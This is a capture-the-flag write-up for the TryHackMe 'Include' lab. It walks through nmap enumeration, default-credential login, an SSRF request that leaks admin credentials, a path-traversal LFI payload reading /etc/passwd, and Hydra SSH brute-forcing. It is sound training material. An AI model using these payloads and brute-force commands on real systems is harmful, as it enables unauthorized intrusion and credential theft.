[## Include](https://tryhackme.com/room/include)



Initial Nmap Scan

```
nmap -sC -sV -p- -O ip_target
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 15:41 CEST
Nmap scan report for 10.10.30.87
Host is up (0.049s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 75:d9:7e:a8:07:49:d7:19:41:54:0e:b1:3f:d4:1c:3b (RSA)
|   256 8f:ce:d2:42:3a:9e:86:c4:33:2c:8d:f9:dc:3d:86:63 (ECDSA)
|_  256 7a:5d:72:f7:50:40:5f:65:43:88:dd:5a:fb:bd:48:3f (ED25519)
25/tcp    open  smtp     Postfix smtpd
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA STLS RESP-CODES UIDL SASL AUTH-RESP-CODE TOP PIPELINING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_imap-capabilities: STARTTLS LOGINDISABLEDA0001 ENABLE IDLE LITERAL+ more ID have LOGIN-REFERRALS SASL-IR post-login listed capabilities Pre-login OK IMAP4rev1
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: more have ENABLE IDLE LITERAL+ post-login ID listed LOGIN-REFERRALS SASL-IR capabilities Pre-login AUTH=PLAIN AUTH=LOGINA0001 OK IMAP4rev1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: CAPA USER RESP-CODES UIDL SASL(PLAIN LOGIN) AUTH-RESP-CODE TOP PIPELINING
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
4000/tcp  open  http     Node.js (Express middleware)
|_http-title: Sign In
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: System Monitoring Portal
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.38 seconds
```

Web Enumeration — Port 50000.

Navigating to http://target_ip:50000 reveals a login page:

![1](https://github.com/user-attachments/assets/c307aaf4-6160-4a0d-8cc2-b5b4ef7b005a)


![2](https://github.com/user-attachments/assets/2180b367-2a36-4ed3-aaaa-1cc48e843ff6)


Used dirsearch, but didn’t find anything interesting:

```
python dirsearch.py -u http://target_ip:50000
```

![1](https://github.com/user-attachments/assets/6edd92bd-55e8-4a06-b1b9-fea1e3cd666e)



Opened port 4000.

![Screenshot 2025-06-12 at 15 56 31](https://github.com/user-attachments/assets/e19c7011-872e-41d4-a827-28e17ea0d9bf)


Logged in using default credentials guest:guest:

![Screenshot 2025-06-12 at 15 59 00](https://github.com/user-attachments/assets/4aee3fb8-2b98-4551-901e-635cb973be50)


Found one of the users has the role "admin":  

![1](https://github.com/user-attachments/assets/862b2e66-595d-4bfb-a8b4-d0e574ab58bf)

![2](https://github.com/user-attachments/assets/c93b5c58-2f0f-46a0-9795-584c70a7f082)

  
Tried changing user roles:  

<img width="924" alt="Screenshot 2025-06-12 at 16 02 22" src="https://github.com/user-attachments/assets/d9557a56-83ed-4fe3-9d99-5ed690a5901b" />

…but nothing happened.

Navigating to http://target_ip:4000/admin/api showed a JSON API:

![Screenshot 2025-06-12 at 16 07 17](https://github.com/user-attachments/assets/c021979e-6d3e-4c99-9da3-5cf15744b04a)


In the settings section, I attempted an internal request::

`http://127.0.0.1:5000/getAllAdmins101099991`

This returned a Base64-encoded string. After decoding it: 

```
echo 'base64 code' | base64 decode
```

I recovered admin credentials, then logged in at 'http://target_ip:50000'


![1](https://github.com/user-attachments/assets/add8a5dd-eba4-4521-bdb4-953831fdd897)


First flag found!

While inspecting the page source after logging into the admin panel on port 50000, I noticed a suspicious PNG reference:

 <img width="903" alt="Screenshot 2025-06-12 at 16 20 30" src="https://github.com/user-attachments/assets/8da06863-ddab-4b4a-853e-edad8b0329a0" />

This hinted at a potential LFI vulnerability. I tested it by modifying the img parameter:  

```
http://target_ip:50000/profile.php?img=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
```
And it worked!

![1](https://github.com/user-attachments/assets/633a2a8a-999f-4584-82a9-be373a1c21c9)


I was able to read /etc/passwd, confirming the vulnerability.

From the file, I identified potential usernames — including joshua.

With the discovered username (joshua), I tried brute-forcing SSH credentials using Hydra:
```
hydra -l joshua -P /usr/share/wordlists/fasttrack.txt target_ip ssh
```

<img width="929" alt="1" src="https://github.com/user-attachments/assets/a69dc2db-4758-46ef-8846-4506b9e03cce" />


It was successful!

Now with valid credentials, I connected via SSH:

```
ssh joshua@target_ip
```

<img width="820" alt="2" src="https://github.com/user-attachments/assets/ffbb0a12-6887-4122-b64f-30451269125d" />


Inside the machine, I found the final flag:

<img width="819" alt="3" src="https://github.com/user-attachments/assets/7dd46958-985e-47c2-82d2-78a37ffd561e" />


**Summary:**


- Enumerated ports via nmap  
- Discovered two web apps on ports 4000 and 50000  
- Gained credentials via SSRF on port 4000
- Logged in to the admin panel and found LFI on port 50000  
- Exploited LFI to gather usernames  
- Brute-forced SSH using Hydra
- Gained shell access and captured the final flag!
